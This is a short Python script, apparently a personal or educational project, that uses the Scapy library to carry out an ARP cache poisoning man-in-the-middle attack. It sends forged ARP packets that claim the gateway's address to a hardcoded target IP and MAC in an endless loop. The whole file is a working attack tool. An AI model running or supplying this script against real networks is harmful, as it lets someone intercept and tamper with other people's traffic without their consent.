# scapy_arp_spoofing.py

"""
Description:
    Uses Scapy to perform a MITM attack involving ARP Spoofing or ARP Cache Poisoning.


Author:
    Nishant Krishna

Created:
    25 November, 2022
"""

import scapy.all as scapy
import time


class ScapyArpSpoofing:
    def do_spoof(self, gateway_ip, target_ip, target_mac):
        # Create ARP request. OP = 1, for ARP requests
        arp = scapy.ARP(op=1, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)

        while 1:
            scapy.send(arp)


if __name__ == "__main__":
    arp_spoofer = ScapyArpSpoofing()
    arp_spoofer.do_spoof('192.168.19.1', '192.168.19.134', '00:0C:29:D5:39:A1')
